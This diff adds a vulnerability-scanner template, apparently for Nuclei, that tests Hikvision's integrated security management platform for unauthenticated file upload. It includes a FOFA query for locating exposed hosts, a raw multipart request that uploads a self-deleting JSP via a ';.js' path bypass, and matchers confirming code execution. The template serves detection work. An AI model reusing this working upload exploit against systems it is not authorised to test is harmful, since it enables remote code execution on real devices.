@@ -1,0 +1,47 @@
+id: Hikvision-iSecure-Cente-clusters-fileupload
+
+info:
+  name: 海康威视综合安防clusters文件上传
+  author: god
+  severity: critical
+  description: 海康威视综合安防clusters文件上传
+  metadata:
+    fofa-query: app="HIKVISION-综合安防管理平台"||title="综合安防管理平台"
+  tags: Hikvision,rce,fileupload
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /clusterMgr/clusters/ssl/file;.js HTTP/1.1
+    Accept: */*
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+    Content-Length: 478
+
+    ----------------------------984514492333278399715408
+    Content-Disposition: form-data; name="file"; filename="languages/default.jsp"
+    Content-Type: image/png
+
+    <% out.print("<pre>");out.println(111 * 111);out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    ----------------------------984514492333278399715408
+    Content-Disposition: form-data; name="proxyAddress"
+
+    8.8.8.8
+    ----------------------------984514492333278399715408--
+  - |+
+    @timeout: 30s
+    GET /clusterMgr/languages/default.jsp;.js HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "12321")'  
+        condition: and
